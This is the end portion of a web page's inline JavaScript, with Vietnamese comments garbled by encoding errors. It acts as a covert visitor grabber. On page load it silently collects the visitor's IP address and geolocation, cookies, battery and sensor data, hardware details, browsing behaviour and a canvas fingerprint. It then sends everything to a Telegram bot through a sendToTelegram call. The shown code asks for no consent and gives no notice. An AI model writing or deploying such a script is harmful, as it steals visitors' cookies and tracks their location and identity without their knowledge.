        return `Di chu·ªôt: ${behavior.mouseMovements || savedBehavior.mouseMovements || 0}; Cu·ªôn: ${behavior.scrolls || savedBehavior.scrolls || 0}; Th·ªùi gian: ${behavior.timeSpent || savedBehavior.timeSpent || 0}s`;
      } catch {
        return 'Ko l·∫•y ƒë∆∞·ª£c!';
      }
    }

    // H√†m t·∫°o fingerprint
    function fetchFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Fingerprint', 2, 15);
        const canvasData = canvas.toDataURL();
        const components = [
          navigator.userAgent,
          navigator.language,
          window.screen.width + 'x' + window.screen.height,
          window.screen.colorDepth,
          new Date().getTimezoneOffset(),
          canvasData,
          navigator.hardwareConcurrency || 'unknown',
          navigator.deviceMemory || 'unknown'
        ];
        const fingerprint = btoa(components.join('|')); // M√£ h√≥a base64
        return fingerprint.slice(0, 50); // C·∫Øt ng·∫Øn ƒë·ªÉ tr√°nh tin nh·∫Øn qu√° d√†i
      } catch {
        return 'Ko l·∫•y ƒë∆∞·ª£c!';
      }
    }

    // H√†m ch√≠nh ƒë·ªÉ thu th·∫≠p v√† g·ª≠i d·ªØ li·ªáu
    async function collectAndSendData() {
      try {
        console.log('Starting data collection...');
        const userAgent = navigator.userAgent;
        const basicInfo = getBasicDeviceInfo(userAgent);
        let deviceType = basicInfo.type;
        if (deviceType === 'mobile') {
          deviceType = userAgent.toLowerCase().includes('iphone') ? 'iPhone' : 'Android';
        } else if (deviceType === 'tablet') {
          deviceType = 'Tablet x·ªãn';
        }

        const [ipInfo, cookies, batteryInfo, otherInfo, additionalInfo, sensors, visitorHistory, behavior, fingerprint] = await Promise.all([
          fetchIpInfo(),
          Promise.resolve(fetchCookies()),
          fetchBatteryInfo(),
          Promise.resolve(fetchOtherInfo()),
          Promise.resolve(fetchAdditionalInfo()),
          fetchSensors(),
          Promise.resolve(fetchVisitorHistory()),
          Promise.resolve(fetchBehavior()),
          Promise.resolve(fetchFingerprint())
        ]);

        const ipHistory = ipInfo.ip !== 'Ko l·∫•y ƒë∆∞·ª£c!' ? manageIpHistory(ipInfo.ip, userAgent) : [];
        const deepGeo = ipInfo.ip !== 'Ko l·∫•y ƒë∆∞·ª£c!' ? await deepSearchGeo(ipInfo.ip) : 'Ko l·∫•y ƒë∆∞·ª£c!';
        const deviceName = await deepSearchDevice(userAgent, deviceType, basicInfo.device) || basicInfo.device;

        const deviceData = {
          timestamp: new Date().toISOString(),
          ip: ipInfo.ip + ipInfo.isVpn,
          ipHistory: ipHistory,
          isp: ipInfo.isp,
          org: ipInfo.org,
          city: ipInfo.city,
          region: ipInfo.region,
          country: ipInfo.country,
          loc: ipInfo.loc,
          postal: ipInfo.postal,
          timezone: ipInfo.timezone,
          deepGeo: deepGeo,
          deviceName: deviceName,
          deviceType: deviceType,
          os: basicInfo.os,
          browser: basicInfo.browser,
          cookies: cookies,
          battery: batteryInfo.battery,
          charging: batteryInfo.charging,
          userAgent: otherInfo.userAgent,
          language: otherInfo.language,
          screen: otherInfo.screen,
          time: otherInfo.time,
          referrer: otherInfo.referrer,
          doNotTrack: otherInfo.doNotTrack,
          colorDepth: additionalInfo.colorDepth,
          touchSupport: additionalInfo.touchSupport,
          cpuCores: additionalInfo.cpuCores,
          memory: additionalInfo.memory,
          connectionType: additionalInfo.connectionType,
          vendor: additionalInfo.vendor,
          webgl: additionalInfo.webgl,
          sensors: sensors,
          visitorHistory: visitorHistory,
          behavior: behavior,
          fingerprint: fingerprint
        };

        console.log('Collected data:', deviceData);
        const message = formatDeviceData(deviceData);
        console.log('Formatted message:', message);
        await sendToTelegram(message);
      } catch (error) {
        console.error('Error in collectAndSendData:', error);
      }
    }

    // Ch·∫°y khi trang t·∫£i
    console.log('Page loaded, initiating collectAndSendData');
    collectAndSendData();
  </script>
</body>
</html>